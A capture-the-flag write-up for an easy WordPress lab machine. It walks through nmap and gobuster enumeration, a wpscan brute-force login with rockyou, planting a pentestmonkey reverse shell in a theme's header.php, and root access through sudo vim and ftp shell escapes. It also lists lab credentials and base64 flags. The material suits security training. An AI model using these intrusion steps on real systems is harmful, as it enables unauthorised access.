tags: #privEsc #easy #gobuster #wpscan #sudoVIM #sudoFTP

IP address: 10.10.64.128
# Enumerations
```
nmap -sC -sV 10.10.250.171 -T5
```

![Pasted image 20240609193857](https://github.com/BGhoster/Write-Ups/assets/43526966/6f731958-4edc-4420-ba9c-9a21f28a5c53)


```
nmap -p- -A 10.10.250.171 -T5
```

![Pasted image 20240609202648](https://github.com/BGhoster/Write-Ups/assets/43526966/3c27e9d4-23d0-4cca-8a2d-ae46d1dea82e)

## Open ports
80: HTTP
4512: ssh

# Gobuster
```python
gobuster dir -u 10.10.250.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

![Pasted image 20240609194252](https://github.com/BGhoster/Write-Ups/assets/43526966/1146d672-58b9-4d46-8d99-fb766a8419b0)

## Directories
/wp-content (Status: 301) [Size: 319] [--> http://10.10.250.171/wp-content/]

/wp-includes (Status: 301) [Size: 320] [--> http://10.10.250.171/wp-includes/]

/wp-admin (Status: 301) [Size: 317] [--> http://10.10.250.171/wp-admin/]

/hidden (Status: 301) [Size: 315] [--> http://10.10.250.171/hidden/]

## Usernames/passwords (Found from /hidden)
Hugo

C0ldd:9876543210

Philip

# Niko Finds
http://10.10.250.171/xmlrpc.php/
There might be a vulnerability with how XML-RPC is set up. Let's try it

> [!NOTE]
> The main weaknesses associated with XML-RPC are: Brute force attacks: Attackers try to login to WordPress using xmlrpc.php .
> lets see how that is actually done & how you might be able to leverage this while your trying to test a wordpress site for any potential vulnerabilites

Did not find anything with xmlrpc.php

# WP-Scans
```bash
 wpscan --url http://10.10.64.128/ -U c0ldd --password-attack wp-login -P /usr/share/wordlists/rockyou.txt
```
### Scan details
[!] XML-RPC seems to be enabled: http://10.10.64.128/xmlrpc.php  
[!] The version is out of date, the latest version is 3.7
### Found credentials 
**c0ldd:9876543210**

![Pasted image 20240609204402](https://github.com/BGhoster/Write-Ups/assets/43526966/5a0eb63e-28cd-40c2-92e1-150f619f735c)


# Getting reverse shell after log-in
Appearance -> Editor 
We will be using header.php and uploading pentest monkey reverse shell.
```python
http://10.10.64.128/wp-content/themes/twentyfifteen/header.php
```
Visiting the site starts the reverse shell.
# Upgrading shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
export TERRM=xterm
```
```
stty raw -echo && fg    
```

# User.txt
```python
grep -Hrn c0ldd / 2>/dev/null
"""
-H: This option forces grep to always print the filename where the match was found, even if there's only one file being searched. It stands for "print filename".

-r: This option tells grep to search recursively through directories. It stands for "recursive".

-n: This option tells grep to prefix each line of output with the line number within its file. It stands for "line number".
"""
```
- /var/www/html/wp-config.php:22:define('DB_USER', 'c0ldd');

![Pasted image 20240609210033](https://github.com/BGhoster/Write-Ups/assets/43526966/fad8129f-ab7d-4f2d-96f7-85984efa1728)

c0ldd:cybersecurity

```
cat user.txt
```
- RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

# Root.txt
```
sudo -l
```

![Pasted image 20240609210351](https://github.com/BGhoster/Write-Ups/assets/43526966/d3af7755-0fb4-491c-8d7a-13b603b45e9a)

## VIM
https://gtfobins.github.io/gtfobins/vim/
```
sudo vim -c ':!/bin/sh'
```
- wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE
## FTP
https://gtfobins.github.io/gtfobins/ftp/
```
sudo ftp
```
```
!/bin/sh
```
- wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE
